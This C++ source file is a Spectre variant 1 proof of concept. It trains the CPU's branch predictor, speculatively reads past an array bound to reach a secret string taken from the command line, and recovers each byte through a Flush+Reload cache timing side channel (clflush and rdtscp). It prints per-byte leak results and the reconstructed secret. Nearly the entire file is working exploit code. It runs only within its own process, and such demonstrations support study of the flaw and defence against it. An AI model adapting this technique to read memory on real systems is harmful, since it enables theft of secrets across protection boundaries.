#include <iostream>
#include <vector>
#include <string>
#include <numeric>  
#include <random>
#include <fstream>
#include <chrono>
#include <stdlib.h>
#include <algorithm>
#ifdef _MSC_VER
#include <intrin.h> 
#else
#include <x86intrin.h>
#endif
using namespace std;
/*
In VS this code works only in debug mode!
 */


/*You can play with this value, to guaratee 100% work
This is time in ms, which says that element in cache
(i.e. if taking by address took <= EXISTS ms that means that this value in cache)
*/
const int EXISTS = 95;

int array1_size = 20;
char array1[30] = {
  'a', 'b', 'c', 'd',
  'e', 'f', 'g', 'h',
  'i', 'j', 'k', 'l',
  'm', 'n', 'o', 'p',
  'q', 'r', 's', 't',
  'u', 'v', 'w', 'x',
  'y', 'z'
};

/*Using indexes: array2[i * 1024]
This will guarantee that different elements will go in different cache lines
*/
char array2[256 * 1024];
string secretString;

char meta = 0;

void unprotected_func(long long x) {
  /*
  x can't be size_t or ptrdiff_t, because that ok if x < 0
  */
  if (x < array1_size) {
    meta = array2[array1[x] * 1024];
  }
}

int main(int argc, char *argv[]) {

  if (argc < 2) {
    cerr << "Sorry you have less then 1 argument. Please input at least 1 argument.";
    exit(1);
  }
  secretString = argv[1];
  int length = secretString.size();
  /*
  Should be long long because can be < 0
  */
  long long offset = (long long)(&secretString[0] - (char *)array1);

  for (int i = 0; i < 256 * 1024; i++)
    array2[i] = i;

  auto delay = []() {
    for (int i = 0; i < 1000; ++i) {}
  };
  auto leak_byte = [&](long long attack_offset) {
    //uint64_t start, end;
    int x = 0;
    unsigned int trash = 0;
    long long currOff = 0;
    vector<int> hitted(256);
    vector<long long> currentOffset(41);
    /*
    We make several attempts,
    since the time of access to the addresses
    of the bytes being checked may vary.
    */
    for (int attempt = 0; attempt < 500; ++attempt) {
      for (int element = 0; element < 256; ++element) {
        _mm_clflush(&array2[element * 1024]);
      }
      delay();
      long long good_offset = attempt % array1_size;

      /* Precalculating training and attacking values */
      /* Use more that 1 iteration to cache them */
      for (int k = 0; k < 10; ++k) {
        for (int i = 1; i <= 40; ++i) {
          if (i % 10 == 0) {
            currentOffset[i] = attack_offset;
          }
          else {
            currentOffset[i] = good_offset;
          }
        }
      }

      delay();
      for (int i = 1; i <= 40; ++i) {
        _mm_clflush(&array1_size);
        delay();
        currOff = currentOffset[i];
        delay();
        unprotected_func(currOff);
      }

      vector<int> permut(256);
      /*Generating random order of checking bytes*/
      iota(permut.begin(), permut.end(), 0);
      random_shuffle(permut.begin(), permut.end());
      _mm_clflush(&array2[good_offset * 1024]);  /* removing value, which we used for training branch predictor from cache */
      delay();
      for (auto i : permut) {
        auto start = __rdtscp(&trash);
        x = array2[i * 1024];
        auto end = __rdtscp(&trash) - start;
        //int t = std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();
        if (end <= EXISTS) {
          ++hitted[i];
        }
      }
    } 

    /*
    Finding our secret byte (i.e. string[offset])
    Secret byte = byte which was most often in cache
    */
    char bestElement;
    int cnt = -1;
    for (int element = 0; element < 256; ++element) {
      if (hitted[element] > cnt) {
        cnt = hitted[element];
        bestElement = (char)element;
      }
    }
    trash += 1;
    /* You can also play with this value */
    if (cnt >= 160)
      return make_pair(bestElement, make_pair(cnt, true));
    return make_pair('?', make_pair(cnt, false));
  };
  string answer = "";
  if (argc == 3) {
    ofstream fout(argv[2]);
    if (fout.is_open()) {
      for (int iter = 0; iter < length; ++iter) {
        auto res = leak_byte(offset + iter);
        string result = res.second.second ? "SUCCESS" : "FAIL";
        fout << "Trying to leak byte " << iter
          << " result=" << result
          << " byte=" << res.first
          << " (" << (int)res.first << ")"
          << " times hit in cache=" << res.second.first << '\n';
        answer.push_back(res.first);
      }
      fout << "Your answer is: " << answer << '\n';
      fout.close();
    }
    else {
      cerr << "Sorry, we can't open your file";
      exit(1);
    }
  }
  else {
    for (int iter = 0; iter < length; ++iter) {
      auto res = leak_byte(offset + iter);
      string result = res.second.second ? "SUCCESS" : "FAIL";
      cout << "Trying to leak byte " << iter
        << " result=" << result
        << " byte=" << res.first
        << " (" << (int)res.first << ")"
        << " times hit in cache=" << res.second.first << '\n';
      answer.push_back(res.first);
    }
    cout << "Your answer is: " << answer << '\n';
  }
  return 0;
}
